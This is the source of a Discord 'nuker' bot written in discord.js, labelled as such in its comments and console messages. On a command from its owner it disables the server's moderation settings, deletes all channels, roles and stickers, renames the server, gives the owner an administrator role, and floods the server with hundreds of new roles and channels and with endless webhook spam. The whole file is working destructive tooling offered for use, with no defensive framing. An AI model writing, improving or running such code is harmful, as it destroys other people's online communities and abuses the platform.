const Discord = require('discord.js');
const { Client, Intents } = require('discord.js');
const client = new Discord.Client({ 
  intents: [
    Intents.FLAGS.GUILDS, 
    Intents.FLAGS.GUILD_MESSAGES, 
    Intents.FLAGS.GUILD_WEBHOOKS, 
    Intents.FLAGS.GUILD_INTEGRATIONS
  ] 
});

const config = require("./config.json");
const prefix = config.prefix;

client.on("ready", () => {
  console.log("bot is coded by virus, distributed by game code")
  console.log(`${client.user.tag} is online.`);
  client.user.setPresence({ activities: [{ name: "trolling"}]});
});

client.on('messageCreate', async message => {
  if(!message.content.startsWith(prefix) || message.author.bot) return;

  const guild = message.guild
  const args = message.content.slice(prefix.length).split(" ");
  const command = args.shift().toLowerCase();

  //Fun stuff aka nuker
  if(message.author.id == config.userid){
    if(command === "n") {
      message.delete();

      if(guild.verificationLevel !== "NONE"){
        guild.setVerificationLevel("NONE")
      }
    
      if(guild.defaultMessageNotifications !== "ALL") {
        guild.setDefaultMessageNotifications("ALL_MESSAGES");
      } 
    
      if(guild.explicitContentFilter !== "DISABLED"){
        guild.setExplicitContentFilter("DISABLED")
      }

      
      guild.channels.cache.forEach((c) => {c.delete()});
      guild.roles.cache.forEach((r) => r.delete().then(console.log(`role ${r.name} was deleted`)).catch((err) => {console.log(("Error Found: " + err))}))
      guild.stickers.cache.forEach((s) => s.delete().then(console.log(`sticker ${s.name} was deleted`)).catch((err) => { console.log(("Error Found: " + err)) }))
      await guild.setName(config.servername);
      await guild.setIcon(config.servericon);
      
      try{
        guild.roles.create({name: config.rolename, permissions: [Permissions.FLAGS.ADMINISTRATOR], color: "#4046dc", hoist: true}).then(role => {
            message.member.roles.add(role)
        })
      }catch(error){
    
    }

    for (let i = 0; i < 500; i++) {
      if (message.guild.roles.cache.size === 500) break;
        else {
          guild.roles.create({ name: config.nukedrole, color: "#58ff00", position: i++ }).catch((err) => {console.log("An error has been found: " + err)})
      }
    }
     
    for(let i = 0; i < 500; i++){
      await guild.channels.create(config.ch, {type: 'GUILD_TEXT'}).then((c) => {c.createWebhook(config.webhookname, {
        avatar: config.webhookpfp
        }).then(async webhook =>{setInterval(() => {
          c.send(config.spamsg);
          webhook.send(config.spamsg)
        })
      })
    })
    setInterval(() => {guild.channels.cache.filter(c => c.isText()).forEach(c => c.send(config.spamsg2))});
  } 
};
};
});

client.login(config.token);
